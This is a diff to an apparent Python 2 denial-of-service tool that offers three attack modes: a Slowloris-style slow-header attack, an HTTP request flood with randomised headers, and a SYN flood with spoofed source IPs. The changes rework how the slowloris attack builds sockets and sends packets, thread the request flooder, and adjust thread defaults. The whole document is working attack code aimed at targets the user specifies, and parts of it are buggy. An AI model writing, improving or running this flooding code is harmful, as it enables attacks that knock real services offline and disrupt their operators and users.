@@ -20,10 +20,12 @@ import sys
 import json
 import time
 import string
+import signal
 import httplib,urlparse
 from random import *
 from socket import *
 from struct import *
+from Queue import Queue
 from threading import *
 from argparse import ArgumentParser,RawTextHelpFormatter
 
@@ -35,6 +37,7 @@ if os.name == 'posix':
 		pass
 else:
 	print '[-] Check your pip installer'
+
 try:
 	import requests,colorama
 	from termcolor import colored,cprint
@@ -43,20 +46,21 @@ except:
 		if os.name == 'posix':
 			os.system('sudo pip install colorama')
 			os.system('sudo pip install termcolor')
-			os.system('sudo pip install reuqests')
-			print '[+] Termcolor,requests have been installed'
+			os.system('sudo pip install requests')
+			sys.exit('[+] I have installed nessecary modules for you')
 		elif os.name == 'nt':
 			os.sytem('c:\python27\scripts\pip.exe install colorama')
 			os.system('c:\python27\scripts\pip.exe install termcolor')
 			os.system('c:\python27\scripts\pip.exe install requests')
-			print '[+] Termcolor has been installed'
+			sys.exit('[+] I have installed nessecary modules for you')
 		else:
-			print '[-] Download and install requests,termcolor'
+			sys.exit('[-] Download and install nessecary modules')
 	except Exception,e:
 		print '[-]',e
 if os.name == 'nt':
 	colorama.init()
 
+signal.signal(signal.SIGPIPE,signal.SIG_DFL)
 screenLock=Semaphore(value=99999)
 
 def fake_ip():
@@ -68,7 +72,6 @@ def fake_ip():
 		fake_ip()
 	fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
 	return fkip
-
 
 def check_tgt(args):
 	tgt = args.d
@@ -97,65 +100,8 @@ def add_bots():
 	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
 	return bots
 
-class Pyslow_request(Thread):
-	def __init__(self,tgt):
-		Thread.__init__(self)
-		self.tgt = tgt
-		ts = []
-		try:
-			t = Thread(target=self.slow_requester)
-			t.daemon=True;ts.append(t)
-			t.start()
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
-	def create_header(self):
-		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
-		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
-		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
-		bot = add_bots()
-		c=choice(cachetype)
-		a=choice(acceptEc)
-		http_header = {
-		    'User-Agent' : choice(add_useragent()),
-		    'Cache-Control' : c,
-		    'Accept-Encoding' : a,
-		    'Keep-Alive' : randint(1,700),
-		    'Host' : self.tgt,
-		    'Referer' : choice(bot)
-		}
-		payload = {
-		    'user' : 'Anonymous',
-		    'password' : 'xxxxxxx',
-		    'data' : 'None data',
-		    'key' : randint(1,10000),
-		    'value' : randint(1,2000),
-		}
-		return (http_header,payload)
-	def make_str(self):
-		mystr=[]
-		cnd=(string.ascii_letters+string.digits)
-		for x in range(3):
-			text = (choice(cnd) for _ in range(randint(1,7)))
-			text = ''.join(text)
-			mystr.append(text)
-		return '='.join(mystr)
-	def remake_url(self):
-		return 'http://'+self.tgt+'/search=?'+self.make_str()
-	def datas(self):
-		url=self.remake_url()
-		(headers,payload)=self.create_header()
-		return (url,headers,payload)
-	def slow_requester(self):
-		(url,headers,payload) = self.datas()
-		try:
-			re1=requests.get(url,headers=headers)
-			re2=requests.post(url,data=json.dumps(payload))
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
-		except Exception:
-			pass
 
-class Pyslow():
+class Pyslow:
 	def __init__(self,tgt,port,to,threads,sleep):
 		self.tgt = tgt
 		self.port = port
@@ -163,63 +109,91 @@ class Pyslow():
 		self.threads = threads
 		self.sleep = sleep
 		self.method = ['GET','POST']
-		self.sockets = []
 		self.pkt_count = 0
-		self.resock = []
-		self.pkt=self.create_packet()
-	def create_packet(self):
-		pkt=str(choice(self.method)+'/'+str(' ?')+str(randint(100,777))+'HTTP/1.1\r\n\r\nHost:'+self.tgt+'User-Agent:'+choice(add_useragent())+'\r\n'+'Content-Length:'+str(randint(45,700))+'\r\n').encode('utf-8')
+	def mypkt(self):
+		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
+		      'Host:'+self.tgt+'\r\n'+\
+		      'User-Agent:'+choice(add_useragent())+'\r\n'+\
+		      'Content-Length: 42\r\n'
+		pkt = buffer(text)
 		return pkt
-	def create_socket(self):
-		x=0
-		setdefaulttimeout(self.to)
-		cprint('\t\tBuilding sockets','blue')
-		while x < (self.threads):
+	def building_socket(self):
+		try:
+			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
+			sock.settimeout(self.to)
+			sock.connect((self.tgt,int(self.port)))
+			self.pkt_count += 3
+			if sock:
+				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
+				self.pkt_count += 1
+		except Exception:
+			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
+			sock.settimeout(self.to)
+			sock.connect((self.tgt,int(self.port)))
+			sock.settimeout(None)
+			self.pkt_count+=3
+			if sock:
+				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
+				self.pkt_count+=1
+		except KeyboardInterrupt:
+			sys.exit(cprint('[-] Canceled by user','red'))
+		return sock
+	def sending_packets(self):
+		try:
 			sock=socket(AF_INET,SOCK_STREAM)
-			self.sockets.append(sock)
-			x+=1
-			if x > self.threads:
+			sock.settimeout(self.to)
+			sock.connect((self.tgt,int(self.port)))
+			self.pkt_count+=3
+			if sock:
+				sock.sendall('X-a: b\r\n')
+				self.pkt+=1
+		except Exception:
+			sock=socket(AF_INET,SOCK_STREAM)
+			sock.settimeout(self.to)
+			sock.connect((self.tgt,int(self.port)))
+			sock.settimeout(None)
+			if sock:
+				sock.sendall('X-a: b\r\n')
+				self.pkt_count+=1
+		except KeyboardInterrupt:
+			sys.exit(cprint('[-] Canceled by user','red'))
+		return sock
+	def doconnection(self):
+		socks = 0
+		fail=0
+		lsocks=[]
+		lhandlers=[]
+		cprint('\t\tBuilding sockets','blue')
+		while socks < range(int(self.threads)):
+			try:
+				sock = self.building_socket()
+				if sock:
+					lsocks.append(sock)
+					socks+=1
+					if socks > int(self.threads):
+						break
+			except Exception:
+				fail+=1
+			except KeyboardInterrupt:
+				sys.exit(cprint('[-] Canceled by user','red'))
+		cprint('\t\tSending packets','blue')
+		while socks < int(self.threads):
+			try:
+				handler = self.sending_packets()
+				if handler:
+					lhandlers.append(handler)
+					socks+=1
+					if socks > int(self.threads):
+						break
+				else:
+					pass
+			except Exception:
+				fail+=1
+			except KeyboardInterrupt:
 				break
-		time.sleep(2)
-	def slower(self):
-		self.create_socket()
-		working = 0
-		for slow in self.sockets:
-			try:
-				slow.connect((self.tgt,self.port))
-				self.resock.append(slow)
-				if slow.sendto(self.pkt,(self.tgt,self.port)):
-					self.pkt_count+=3 ;working=1
-					screenLock.acquire()
-				else:
-					cprint('The target maybe bussy','red')
-					screenLock.acquire()
-			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
-			except:
-				pass
-			finally:
-				screenLock.release()
-		self.sending_data()
-	def sending_data(self):
-		cprint('\tSending data...','green')
-		for x in self.resock:
-			try:
-				if x.sendall('X-a: b\r\n'):
-					x.shutdown(1)
-					x.close()
-					self.pkt_count+=self.pkt_count
-				else:
-					x.shutdown(1)
-					x.close()
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
-			except:
-				pass
-		print colored('I have sent ','green') + str(colored(self.pkt_count,'cyan')) + colored(' packets successfully.','green')
-		if time.sleep(self.st):
-			t=Pyslow_request(self.tgt)
-			t.slow_requester()
+		print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
+		time.sleep(self.sleep)
 class Requester(Thread):
 	def __init__(self,tgt,threads):
 		Thread.__init__(self)
@@ -235,7 +209,16 @@ class Requester(Thread):
 				self.port = 443
 		else:
 			self.port = 80
-		self._run()
+		ts = []
+		try:
+			t=Thread(target=self._run)
+			t.daemon=True
+			ts.append(t)
+			t.start()
+		except KeyboardInterrupt:
+			sys.exit(cprint('[-] Canceled by user','red'))
+			t.stop()
+		t.join(2)
 	def _run(self):
 		self.requesting()
 	def header(self):
@@ -249,7 +232,7 @@ class Requester(Thread):
 		    'User-Agent' : choice(add_useragent()),
 		    'Cache-Control' : c,
 		    'Accept-Encoding' : a,
-		    'Keep-Alive' : randint(1,700),
+		    'Keep-Alive' : '42',
 		    'Host' : self.tgt,
 		    'Referer' : choice(bot)
 		}
@@ -379,13 +362,13 @@ class Synflood(Thread):
 		packet = ip_header + tcp_header
 
 		try: 
-			print colored('[-->] Synflood to ','green') + colored(self.tgt,'red');time.sleep(.3)
+			print colored('[-->] Synflood to ','green') + colored(self.tgt,'red')
 			self.sock.sendto(packet,(self.tgt,int(self.port)))
 			screenLock.acquire()
 		except KeyboardInterrupt:
 			sys.exit()
 		except Exception,e:
-			print '[-]',e
+			cprint(e,'red')
 		finally:
 			screenLock.release()
 
@@ -407,7 +390,7 @@ Example:
 	options = parser.add_argument_group('options','')
 	options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
 	options.add_argument('-t',metavar='<float>',default=5.0,help='Set timeout for socket')
-	options.add_argument('-T',metavar='<int>',default=2000,help='Set threads number for connection (default = 2000)')
+	options.add_argument('-T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
 	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
 	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
 	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
@@ -431,7 +414,7 @@ Example:
 			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
 		tgt=check_tgt(args)
 		ts=[]
-		while True:
+		while 1:
 			if args.i == False:
 				args.fakeip = True
 				if args.fakeip == True:
@@ -448,11 +431,11 @@ Example:
 			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
 			t.join()
-	if args.request:
+	elif args.request:
 		tgt = args.d
 		threads = int(args.T)
 		ts=[]
-		while True:
+		while 1:
 			try:
 				for x in range(int(args.T)):
 					t = Requester(tgt,threads)
@@ -460,8 +443,8 @@ Example:
 					t.start()
 				t.join(1)
 			except KeyboardInterrupt:
-				cprint('[-] Canceled by user','red')
-	if args.pyslow:
+				sys.exit(cprint('[-] Canceled by user','red'))
+	elif args.pyslow:
 		try:
 			tgt = args.d
 			port = int(args.p)
@@ -470,19 +453,12 @@ Example:
 			threads = int(args.T)
 		except Exception,e:
 			print '[-]',e
-		s=0
-		ts=[]
-		try:
-			while True:
-				for x in range(threads):
-					t1=Pyslow_request(tgt)
-					ts.append(t1);t1.daemon=True
-					t1.start();t1.join(1)
-					pyslow=Pyslow(tgt,port,to,threads,st)
-					pyslow.slower()
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
-
+		while 1:
+			try:
+				worker=Pyslow(tgt,port,to,threads,st)
+				worker.doconnection()
+			except KeyboardInterrupt:
+				sys.exit(cprint('[-] Canceled by user','red'))
 	if not (args.synflood) and not (args.request) and not (args.pyslow):
 		parser.print_help()
 		print
